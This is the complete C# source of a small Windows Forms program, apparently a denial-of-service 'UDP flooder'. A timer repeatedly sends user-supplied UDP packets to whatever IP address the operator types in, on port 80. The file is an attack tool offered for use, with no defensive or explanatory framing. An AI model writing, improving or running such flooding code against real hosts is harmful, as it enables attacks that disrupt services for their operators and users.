using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;

namespace DoS_UDP_Flooder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            FlooderTimer.Start();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            FlooderTimer.Stop();
        }
        public void Flood()
        {
            UdpClient target = new UdpClient();
            IPAddress TgtIP = IPAddress.Parse(txtTgtIP.Text);
            try
            {
                target.Connect(TgtIP, 80);
                byte[] sendBytes = Encoding.ASCII.GetBytes(txtTxt.Text);
                target.Send(sendBytes, sendBytes.Length);
                target.AllowNatTraversal(true);
                target.DontFragment = true;
            }
            catch
            {
                const string errorMsg = "something went wron...";
                const string errorCaption = "make sure your data";
                MessageBox.Show(errorMsg, errorCaption, MessageBoxButtons.OK);
            }
            
        }

        private void FlooderTimer_Tick(object sender, EventArgs e)
        {
            Flood();
        }
    }
}
